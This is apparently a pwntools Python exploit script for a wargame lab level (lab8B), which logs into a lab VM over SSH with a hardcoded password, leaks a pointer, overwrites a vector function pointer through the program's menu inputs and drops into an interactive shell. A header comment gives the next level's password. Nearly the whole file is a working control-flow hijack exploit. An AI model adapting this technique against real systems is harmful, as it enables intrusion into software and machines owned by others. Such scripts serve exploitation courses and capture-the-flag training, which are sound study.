# lab8A: Th@t_w@5_my_f@v0r1t3_ch@11

import sys
import struct

from pwn import *

def main():

  session = ssh(host="192.168.159.129", user="lab8B", password="3v3ryth1ng_Is_@_F1l3")
  sh = session.process("/bin/sh", env={"PS1":""})

  sh.sendline("/levels/lab08/lab8B")
  sh.read()

  leak_addr = info_leak(sh)
  log.info("Leaked pointer to v3 => 0x%08x" % leak_addr)

  win_func = (leak_addr + (0x190e27 + 27)) / 2 # call system("/bin/sh")

  log.info("Call to system at 0x%08x" % int(win_func*2))

  for i in range(1,3):
    log.info("Writing to vector v%d" % i)
    sendget(sh, "1")                # enterdata
    sendget(sh, "%d" % i)           # vector

    sendget(sh, "B")
    sendget(sh, "16705")
    sendget(sh, "66")
    sendget(sh, "%d" % win_func)    # EIP OVERWRITE
    sendget(sh, "1094795585")
    sendget(sh, "1094795585")
    sendget(sh, "1094795585")
    sendget(sh, "4702111234474983745")
    sendget(sh, "4702111234474983745")

  sendget(sh, "2")   # call sumVector
  for i in range(9):
    sendget(sh, "4") # call sumVector 

  # overwrite v1 pointer
  log.info("Overwriting vector table entry")
  sendget(sh, "6")
  sendget(sh, "3")
  sendget(sh, "1")

  # trigger call to v1
  log.success("Calling overwritten vector (v1)")
  sendget(sh, "3")
  sendget(sh, "1")

  sh.interactive()

# info_leak: guess what it does?
def info_leak(sh):

  sendget(sh, "3")                        # call <vectorSel>
  leak = sendget(sh, "1", True)[:4][::-1] # call eax

  leak = format_address(leak)
  
  return leak

# format_address: format address string into proper integer form for struct
def format_address(str_buff):

  try:
    int_fmt = int("0x{:02x}{:02x}{:02x}{:02x}".format(
      str_buff[0], str_buff[1],
      str_buff[2], str_buff[3]),
    16)
  except:
    print("[-] failed to format address")
    exit(-1)

  return int_fmt

# sendget: send bytes and retrieve bytes (less code if in function)
def sendget(sh, message, print_output=False):

  sh.sendline(message)
  if print_output == False:
    sh.read()
  else:
    return sh.read()

  return

main()
